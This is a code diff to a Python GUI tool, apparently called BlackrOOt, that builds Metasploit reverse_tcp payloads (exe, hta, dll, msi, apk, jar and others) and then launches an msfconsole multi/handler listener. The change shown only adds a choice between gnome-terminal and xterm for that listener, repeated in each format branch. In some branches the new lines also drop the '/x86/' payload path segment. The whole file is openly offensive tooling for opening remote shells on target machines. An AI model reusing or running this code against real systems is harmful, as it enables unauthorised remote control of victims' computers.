@@ -128,7 +128,11 @@ try:
 							ok_save = QMessageBox.about(self.window,"GOOD","Saved as : "+str(self.save.text()+"."+self.formats.currentText()))
 							runmetasploit = QMessageBox.question(self.window,"run Metasploit ? ","Do you want to create a session listening ? ",QMessageBox.Yes|QMessageBox.No)
 							if runmetasploit == QMessageBox.Yes:
-								os.system("xterm -title BlackrOOt -e msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit -j\"")
+								terminal = QMessageBox.question(self.window,"Terminal ? ","Use Terminal ? ","gnome-terminal","xterm")
+								if terminal == 0:
+									os.system("gnome-terminal -e \'msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit -j\"'")
+								elif terminal == 1:
+									os.system("xterm -title BlackrOOt -e msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit -j\"")
 						else:
 							error_save = QMessageBox.about(self.window,"ERROR","ERROR")
 					elif self.formats.currentText() == "bat": #powershell
@@ -142,7 +146,11 @@ try:
 							ok_save = QMessageBox.about(self.window,"GOOD","Saved as : "+str(self.save.text()+"."+self.formats.currentText()))
 							runmetasploit = QMessageBox.question(self.window,"run Metasploit ? ","Do you want to create a session listening ? ",QMessageBox.Yes|QMessageBox.No)
 							if runmetasploit == QMessageBox.Yes:
-								os.system("xterm -title BlackrOOt -e msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit -j\"")
+								terminal = QMessageBox.question(self.window,"Terminal ? ","Use Terminal ? ","gnome-terminal","xterm")
+								if terminal == 0:
+									os.system("gnome-terminal -e \'msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit -j\"'")
+								elif terminal == 1:
+									os.system("xterm -title BlackrOOt -e msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit -j\"")
 						else:
 							error_save = QMessageBox.about(self.window,"ERROR","ERROR")
 					elif self.formats.currentText() == "hta": #hta-psh
@@ -156,7 +164,11 @@ try:
 							ok_save = QMessageBox.about(self.window,"GOOD","Saved as : "+str(self.save.text()+"."+self.formats.currentText()))
 							runmetasploit = QMessageBox.question(self.window,"run Metasploit ? ","Do you want to create a session listening ? ",QMessageBox.Yes|QMessageBox.No)
 							if runmetasploit == QMessageBox.Yes:
-								os.system("xterm -title BlackrOOt -e msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit -j\"")
+								terminal = QMessageBox.question(self.window,"Terminal ? ","Use Terminal ? ","gnome-terminal","xterm")
+								if terminal == 0:
+									os.system("gnome-terminal -e \'msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit -j\"'")
+								elif terminal == 1:
+									os.system("xterm -title BlackrOOt -e msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit -j\"")
 						else:
 							error_save = QMessageBox.about(self.window,"ERROR","ERROR")
 					elif self.formats.currentText() == "dll": #dll
@@ -170,7 +182,11 @@ try:
 							ok_save = QMessageBox.about(self.window,"GOOD","Saved as : "+str(self.save.text()+"."+self.formats.currentText()))
 							runmetasploit = QMessageBox.question(self.window,"run Metasploit ? ","Do you want to create a session listening ? ",QMessageBox.Yes|QMessageBox.No)
 							if runmetasploit == QMessageBox.Yes:
-								os.system("xterm -title BlackrOOt -e msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit -j\"")
+								terminal = QMessageBox.question(self.window,"Terminal ? ","Use Terminal ? ","gnome-terminal","xterm")
+								if terminal == 0:
+									os.system("gnome-terminal -e \'msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit -j\"'")
+								elif terminal == 1:
+									os.system("xterm -title BlackrOOt -e msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit -j\"")
 						else:
 							error_save = QMessageBox.about(self.window,"ERROR","ERROR")
 					elif self.formats.currentText() == "msi": #msi
@@ -184,7 +200,11 @@ try:
 							ok_save = QMessageBox.about(self.window,"GOOD","Saved as : "+str(self.save.text()+"."+self.formats.currentText()))
 							runmetasploit = QMessageBox.question(self.window,"run Metasploit ? ","Do you want to create a session listening ? ",QMessageBox.Yes|QMessageBox.No)
 							if runmetasploit == QMessageBox.Yes:
-								os.system("xterm -title BlackrOOt -e msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit -j\"")
+								terminal = QMessageBox.question(self.window,"Terminal ? ","Use Terminal ? ","gnome-terminal","xterm")
+								if terminal == 0:
+									os.system("gnome-terminal -e \'msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit -j\"'")
+								elif terminal == 1:
+									os.system("xterm -title BlackrOOt -e msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit -j\"")
 						else:
 							error_save = QMessageBox.about(self.window,"ERROR","ERROR")
 					elif self.formats.currentText() == "psh": #psh
@@ -198,7 +218,11 @@ try:
 							ok_save = QMessageBox.about(self.window,"GOOD","Saved as : "+str(self.save.text()+"."+self.formats.currentText()))
 							runmetasploit = QMessageBox.question(self.window,"run Metasploit ? ","Do you want to create a session listening ? ",QMessageBox.Yes|QMessageBox.No)
 							if runmetasploit == QMessageBox.Yes:
-								os.system("xterm -title BlackrOOt -e msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit -j\"")
+								terminal = QMessageBox.question(self.window,"Terminal ? ","Use Terminal ? ","gnome-terminal","xterm")
+								if terminal == 0:
+									os.system("gnome-terminal -e \'msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit -j\"'")
+								elif terminal == 1:
+									os.system("xterm -title BlackrOOt -e msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit -j\"")
 						else:
 							error_save = QMessageBox.about(self.window,"ERROR","ERROR")
 				##############################################################################################################################################################################################################################################################################################################################################
@@ -213,7 +237,11 @@ try:
 						ok_save = QMessageBox.about(self.window,"GOOD","Saved as : "+str(self.save.text()+"."+self.formats.currentText()))
 						runmetasploit = QMessageBox.question(self.window,"run Metasploit ? ","Do you want to create a session listening ? ",QMessageBox.Yes|QMessageBox.No)
 						if runmetasploit == QMessageBox.Yes:
-							os.system("xterm -title BlackrOOt -e msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit -j\"")
+							terminal = QMessageBox.question(self.window,"Terminal ? ","Use Terminal ? ","gnome-terminal","xterm")
+							if terminal == 0:
+								os.system("gnome-terminal -e \'msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit -j\"'")
+							elif terminal == 1:
+								os.system("xterm -title BlackrOOt -e msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit -j\"")
 					else:
 						error_save = QMessageBox.about(self.window,"ERROR","ERROR")
 				elif self.formats.currentText() == "bat":
@@ -227,7 +255,11 @@ try:
 						ok_save = QMessageBox.about(self.window,"GOOD","Saved as : "+str(self.save.text()+"."+self.formats.currentText()))
 						runmetasploit = QMessageBox.question(self.window,"run Metasploit ? ","Do you want to create a session listening ? ",QMessageBox.Yes|QMessageBox.No)
 						if runmetasploit == QMessageBox.Yes:
-							os.system("xterm -title BlackrOOt -e msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit -j\"")
+							terminal = QMessageBox.question(self.window,"Terminal ? ","Use Terminal ? ","gnome-terminal","xterm")
+							if terminal == 0:
+								os.system("gnome-terminal -e \'msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit -j\"'")
+							elif terminal == 1:
+								os.system("xterm -title BlackrOOt -e msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit -j\"")
 					else:
 						error_save = QMessageBox.about(self.window,"ERROR","ERROR")
 				elif self.formats.currentText() == "hta":
@@ -241,7 +273,11 @@ try:
 						ok_save = QMessageBox.about(self.window,"GOOD","Saved as : "+str(self.save.text()+"."+self.formats.currentText()))
 						runmetasploit = QMessageBox.question(self.window,"run Metasploit ? ","Do you want to create a session listening ? ",QMessageBox.Yes|QMessageBox.No)
 						if runmetasploit == QMessageBox.Yes:
-							os.system("xterm -title BlackrOOt -e msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit -j\"")
+							terminal = QMessageBox.question(self.window,"Terminal ? ","Use Terminal ? ","gnome-terminal","xterm")
+							if terminal == 0:
+								os.system("gnome-terminal -e \'msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit -j\"'")
+							elif terminal == 1:
+								os.system("xterm -title BlackrOOt -e msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit -j\"")
 					else:
 						error_save = QMessageBox.about(self.window,"ERROR","ERROR")
 				elif self.formats.currentText() == "dll":
@@ -255,7 +291,11 @@ try:
 						ok_save = QMessageBox.about(self.window,"GOOD","Saved as : "+str(self.save.text()+"."+self.formats.currentText()))
 						runmetasploit = QMessageBox.question(self.window,"run Metasploit ? ","Do you want to create a session listening ? ",QMessageBox.Yes|QMessageBox.No)
 						if runmetasploit == QMessageBox.Yes:
-							os.system("xterm -title BlackrOOt -e msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit -j\"")
+							terminal = QMessageBox.question(self.window,"Terminal ? ","Use Terminal ? ","gnome-terminal","xterm")
+							if terminal == 0:
+								os.system("gnome-terminal -e \'msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit -j\"'")
+							elif terminal == 1:
+								os.system("xterm -title BlackrOOt -e msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit -j\"")
 					else:
 						error_save = QMessageBox.about(self.window,"ERROR","ERROR")
 				elif self.formats.currentText() == "msi":
@@ -269,7 +309,11 @@ try:
 						ok_save = QMessageBox.about(self.window,"GOOD","Saved as : "+str(self.save.text()+"."+self.formats.currentText()))
 						runmetasploit = QMessageBox.question(self.window,"run Metasploit ? ","Do you want to create a session listening ? ",QMessageBox.Yes|QMessageBox.No)
 						if runmetasploit == QMessageBox.Yes:
-							os.system("xterm -title BlackrOOt -e msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit -j\"")
+							terminal = QMessageBox.question(self.window,"Terminal ? ","Use Terminal ? ","gnome-terminal","xterm")
+							if terminal == 0:
+								os.system("gnome-terminal -e \'msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit -j\"'")
+							elif terminal == 1:
+								os.system("xterm -title BlackrOOt -e msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit -j\"")
 					else:
 						error_save = QMessageBox.about(self.window,"ERROR","ERROR")
 				elif self.formats.currentText() == "psh":
@@ -283,7 +327,11 @@ try:
 						ok_save = QMessageBox.about(self.window,"GOOD","Saved as : "+str(self.save.text()+"."+self.formats.currentText()))
 						runmetasploit = QMessageBox.question(self.window,"run Metasploit ? ","Do you want to create a session listening ? ",QMessageBox.Yes|QMessageBox.No)
 						if runmetasploit == QMessageBox.Yes:
-							os.system("xterm -title BlackrOOt -e msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit -j\"")
+							terminal = QMessageBox.question(self.window,"Terminal ? ","Use Terminal ? ","gnome-terminal","xterm")
+							if terminal == 0:
+								os.system("gnome-terminal -e \'msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit -j\"'")
+							elif terminal == 1:
+								os.system("xterm -title BlackrOOt -e msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit -j\"")
 					else:
 						error_save = QMessageBox.about(self.window,"ERROR","ERROR")
 			##################################################################################################
@@ -300,7 +348,11 @@ try:
 							ok_save = QMessageBox.about(self.window,"GOOD","Saved as : "+str(self.save.text()+"."+self.formats.currentText()))
 							runmetasploit = QMessageBox.question(self.window,"run Metasploit ? ","Do you want to create a session listening ? ",QMessageBox.Yes|QMessageBox.No)
 							if runmetasploit == QMessageBox.Yes:
-								os.system("xterm -title BlackrOOt -e msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/x86/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit -j\"")
+								terminal = QMessageBox.question(self.window,"Terminal ? ","Use Terminal ? ","gnome-terminal","xterm")
+								if terminal == 0:
+									os.system("gnome-terminal -e \'msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit -j\"'")
+								elif terminal == 1:
+									os.system("xterm -title BlackrOOt -e msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit -j\"")
 						else:
 							error_save = QMessageBox.about(self.window,"ERROR","ERROR")
 				###########################################################################################################################################################################################################################################################################################
@@ -315,7 +367,11 @@ try:
 						ok_save = QMessageBox.about(self.window,"GOOD","Saved as : "+str(self.save.text()+"."+self.formats.currentText()))
 						runmetasploit = QMessageBox.question(self.window,"run Metasploit ? ","Do you want to create a session listening ? ",QMessageBox.Yes|QMessageBox.No)
 						if runmetasploit == QMessageBox.Yes:
-							os.system("xterm -title BlackrOOt -e msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/x86/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit -j\"")
+							terminal = QMessageBox.question(self.window,"Terminal ? ","Use Terminal ? ","gnome-terminal","xterm")
+							if terminal == 0:
+								os.system("gnome-terminal -e \'msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit -j\"'")
+							elif terminal == 1:
+								os.system("xterm -title BlackrOOt -e msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit -j\"")
 					else:
 						error_save = QMessageBox.about(self.window,"ERROR","ERROR")
 			###################################################################################################
@@ -332,7 +388,11 @@ try:
 							ok_save = QMessageBox.about(self.window,"GOOD","Saved as : "+str(self.save.text()+"."+self.formats.currentText()))
 							runmetasploit = QMessageBox.question(self.window,"run Metasploit ? ","Do you want to create a session listening ? ",QMessageBox.Yes|QMessageBox.No)
 							if runmetasploit == QMessageBox.Yes:
-								os.system("xterm -title BlackrOOt -e msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit -j\"")
+								terminal = QMessageBox.question(self.window,"Terminal ? ","Use Terminal ? ","gnome-terminal","xterm")
+								if terminal == 0:
+									os.system("gnome-terminal -e \'msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit -j\"'")
+								elif terminal == 1:
+									os.system("xterm -title BlackrOOt -e msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit -j\"")
 						else:
 							error_save = QMessageBox.about(self.window,"ERROR","ERROR")
 				elif self.formats.currentText() == "apk":
@@ -346,7 +406,11 @@ try:
 						ok_save = QMessageBox.about(self.window,"GOOD","Saved as : "+str(self.save.text()+"."+self.formats.currentText()))
 						runmetasploit = QMessageBox.question(self.window,"run Metasploit ? ","Do you want to create a session listening ? ",QMessageBox.Yes|QMessageBox.No)
 						if runmetasploit == QMessageBox.Yes:
-							os.system("xterm -title BlackrOOt -e msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit -j\"")
+							terminal = QMessageBox.question(self.window,"Terminal ? ","Use Terminal ? ","gnome-terminal","xterm")
+							if terminal == 0:
+								os.system("gnome-terminal -e \'msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit -j\"'")
+							elif terminal == 1:
+								os.system("xterm -title BlackrOOt -e msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit -j\"")
 					else:
 						error_save = QMessageBox.about(self.window,"ERROR","ERROR")
 			###################################################################################################
@@ -364,7 +428,11 @@ try:
 								ok_save = QMessageBox.about(self.window,"GOOD","Saved as : "+str(self.save.text()+"."+self.formats.currentText()))
 								runmetasploit = QMessageBox.question(self.window,"run Metasploit ? ","Do you want to create a session listening ? ",QMessageBox.Yes|QMessageBox.No)
 								if runmetasploit == QMessageBox.Yes:
-									os.system("xterm -title BlackrOOt -e msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit -j\"")
+									terminal = QMessageBox.question(self.window,"Terminal ? ","Use Terminal ? ","gnome-terminal","xterm")
+									if terminal == 0:
+										os.system("gnome-terminal -e \'msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit -j\"'")
+									elif terminal == 1:
+										os.system("xterm -title BlackrOOt -e msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit -j\"")
 							else:
 								error_save = QMessageBox.about(self.window,"ERROR","ERROR")
 						elif self.payload.currentText() == "meterpreter":
@@ -378,7 +446,11 @@ try:
 								ok_save = QMessageBox.about(self.window,"GOOD","Saved as : "+str(self.save.text()+"."+self.formats.currentText()))
 								runmetasploit = QMessageBox.question(self.window,"run Metasploit ? ","Do you want to create a session listening ? ",QMessageBox.Yes|QMessageBox.No)
 								if runmetasploit == QMessageBox.Yes:
-									os.system("xterm -title BlackrOOt -e msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit -j\"")
+									terminal = QMessageBox.question(self.window,"Terminal ? ","Use Terminal ? ","gnome-terminal","xterm")
+									if terminal == 0:
+										os.system("gnome-terminal -e \'msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit -j\"'")
+									elif terminal == 1:
+										os.system("xterm -title BlackrOOt -e msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit -j\"")
 							else:
 								error_save = QMessageBox.about(self.window,"ERROR","ERROR")
 				elif self.formats.currentText() == "py":
@@ -393,7 +465,11 @@ try:
 							ok_save = QMessageBox.about(self.window,"GOOD","Saved as : "+str(self.save.text()+"."+self.formats.currentText()))
 							runmetasploit = QMessageBox.question(self.window,"run Metasploit ? ","Do you want to create a session listening ? ",QMessageBox.Yes|QMessageBox.No)
 							if runmetasploit == QMessageBox.Yes:
-								os.system("xterm -title BlackrOOt -e msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit -j\"")
+								terminal = QMessageBox.question(self.window,"Terminal ? ","Use Terminal ? ","gnome-terminal","xterm")
+								if terminal == 0:
+									os.system("gnome-terminal -e \'msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit -j\"'")
+								elif terminal == 1:
+									os.system("xterm -title BlackrOOt -e msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit -j\"")
 						else:
 							error_save = QMessageBox.about(self.window,"ERROR","ERROR")
 					elif self.payload.currentText() == "meterpreter":
@@ -407,7 +483,11 @@ try:
 							ok_save = QMessageBox.about(self.window,"GOOD","Saved as : "+str(self.save.text()+"."+self.formats.currentText()))
 							runmetasploit = QMessageBox.question(self.window,"run Metasploit ? ","Do you want to create a session listening ? ",QMessageBox.Yes|QMessageBox.No)
 							if runmetasploit == QMessageBox.Yes:
-								os.system("xterm -title BlackrOOt -e msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit -j\"")
+								terminal = QMessageBox.question(self.window,"Terminal ? ","Use Terminal ? ","gnome-terminal","xterm")
+								if terminal == 0:
+									os.system("gnome-terminal -e \'msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit -j\"'")
+								elif terminal == 1:
+									os.system("xterm -title BlackrOOt -e msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit -j\"")
 						else:
 							error_save = QMessageBox.about(self.window,"ERROR","ERROR")
 			###################################################################################################
@@ -424,7 +504,11 @@ try:
 							ok_save = QMessageBox.about(self.window,"GOOD","Saved as : "+str(self.save.text()+"."+self.formats.currentText()))
 							runmetasploit = QMessageBox.question(self.window,"run Metasploit ? ","Do you want to create a session listening ? ",QMessageBox.Yes|QMessageBox.No)
 							if runmetasploit == QMessageBox.Yes:
-								os.system("xterm -title BlackrOOt -e msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit -j\"")
+								terminal = QMessageBox.question(self.window,"Terminal ? ","Use Terminal ? ","gnome-terminal","xterm")
+								if terminal == 0:
+									os.system("gnome-terminal -e \'msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit -j\"'")
+								elif terminal == 1:
+									os.system("xterm -title BlackrOOt -e msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit -j\"")
 						else:
 							error_save = QMessageBox.about(self.window,"ERROR","ERROR")
 					elif self.formats.currentText() == "jar":
@@ -438,7 +522,11 @@ try:
 							ok_save = QMessageBox.about(self.window,"GOOD","Saved as : "+str(self.save.text()+"."+self.formats.currentText()))
 							runmetasploit = QMessageBox.question(self.window,"run Metasploit ? ","Do you want to create a session listening ? ",QMessageBox.Yes|QMessageBox.No)
 							if runmetasploit == QMessageBox.Yes:
-								os.system("xterm -title BlackrOOt -e msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit -j\"")
+								terminal = QMessageBox.question(self.window,"Terminal ? ","Use Terminal ? ","gnome-terminal","xterm")
+								if terminal == 0:
+									os.system("gnome-terminal -e \'msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit -j\"'")
+								elif terminal == 1:
